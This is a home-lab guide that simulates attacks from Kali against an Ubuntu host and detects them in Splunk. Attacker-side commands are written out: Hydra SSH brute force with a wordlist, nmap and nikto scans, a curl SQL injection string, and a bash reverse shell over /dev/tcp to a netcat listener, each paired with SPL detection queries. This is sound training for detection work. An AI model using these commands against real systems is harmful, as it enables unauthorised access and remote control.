# Lab 5 Ubuntu Log Analysis

Assumption:

- Kali = attacker
    
- Ubuntu = victim (with Splunk forwarder sending logs)
    
- Splunk Enterprise = running on separate Ubuntu server


## Simulate SSH Brute Force (Very Common Attack)

This is the easiest and most realistic first test.

#### On Kali (Attacker)

Use Hydra:

```bash
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://<UBUNTU_IP>
```

If you don’t have rockyou extracted:

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

⚠️ Use a test account, not a real user.

---

#### What Gets Logged on Ubuntu

Ubuntu logs SSH activity in:

```
/var/log/auth.log
```

You should see:

- Failed password attempts

- Invalid user

- Accepted password (if successful)


---

####  Search in Splunk

Go to **Search & Reporting** and try:

```spl
index=* sourcetype=linux_secure
```

If that doesn't work:

```spl
index=* auth.log
```

More specific:

```spl
index=* "Failed password"
```

Filter by attacker IP:

```spl
index=* "Failed password" <KALI_IP>
```

Count brute force attempts:

```spl
index=* "Failed password" 
| stats count by src
```

If src field doesn’t exist:

```spl
index=* "Failed password"
| rex "from (?<attacker_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by attacker_ip
```

Now you can clearly see brute force attempts.

---

## Simulate Port Scanning (Recon Attack)

From Kali:

```bash
nmap -sS <UBUNTU_IP>
```

Or aggressive scan:

```bash
nmap -A <UBUNTU_IP>
```

---

#### What Gets Logged?

Ubuntu logs connection attempts in:

- `/var/log/syslog`

- firewall logs (if UFW enabled)


If UFW is enabled:

```bash
sudo ufw enable
sudo ufw logging on
```

Logs go to:

```
/var/log/ufw.log
```

---

#### Search in Splunk

```spl
index=* nmap
```

Or:

```spl
index=* <KALI_IP>
```

If using UFW:

```spl
index=* sourcetype=ufw
```

Count scanned ports:

```spl
index=* <KALI_IP>
| stats count by dest_port
```

---

## Simulate Failed Sudo Privilege Escalation

On Ubuntu victim:

Attempt wrong sudo password multiple times:

```bash
sudo su
```

Enter wrong password.

---

Search in Splunk:

```spl
index=* "authentication failure"
```

Or:

```spl
index=* "sudo"
```

---

## Simulate Web Attack (If Apache Installed)

Install Apache on Ubuntu:

```bash
sudo apt install apache2
```

From Kali:

```bash
nikto -h http://<UBUNTU_IP>
```

Or simple SQL injection test:

```bash
curl "http://<UBUNTU_IP>/index.php?id=1' OR '1'='1"
```

---

Logs location:

```
/var/log/apache2/access.log
/var/log/apache2/error.log
```

Search in Splunk:

```spl
index=* sourcetype=apache_access
```

Look for SQL injection patterns:

```spl
index=* "' OR '1'='1"
```

---

## Simulate Reverse Shell Attempt

From Kali:

```bash
nc -lvnp 4444
```

On Ubuntu:

```bash
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
```

Search in Splunk:

```spl
index=* "bash"
```

Or:

```spl
index=* <KALI_IP>
```

---

### Now Important — Create Detection Queries

Example Brute Force Detection:

```spl
index=* "Failed password"
| stats count by src
| where count > 5
```

This shows possible brute force.

---

